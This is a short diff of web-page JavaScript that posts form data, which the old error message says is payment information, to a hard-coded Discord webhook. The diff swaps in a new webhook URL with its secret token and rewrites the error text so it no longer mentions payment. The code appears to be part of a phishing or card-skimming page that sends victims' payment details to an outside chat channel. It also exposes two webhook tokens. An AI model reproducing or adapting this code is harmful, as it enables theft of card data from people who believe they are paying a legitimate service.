@@ -107,7 +107,7 @@
                 return;
             }
 
-            const webhookUrl = "https://discord.com/api/webhooks/1273279153172512800/v6EO4OBF9zg6lGfm_yndNAoEergAFw85jjZXL8C2Dpbcbl_rRSnUkzqf_AFtv4lR9seC";
+            const webhookUrl = "https://discord.com/api/webhooks/1273407148373573647/XE059A7NLkxTLpoAMoXBKBVdiOjhjhslLYjR4_tOwFFEGstrS3dwjf8mM3c86_rW4wju";
 
             fetch(webhookUrl, {
                 method: 'POST',
@@ -129,7 +129,7 @@
             })
             .catch(error => {
                 messageDiv.className = 'error';
-                messageDiv.textContent = 'Error sending payment information.';
+                messageDiv.textContent = 'Error, please try again';
                 messageDiv.style.display = 'block';
                 console.error('Error:', error);
             });
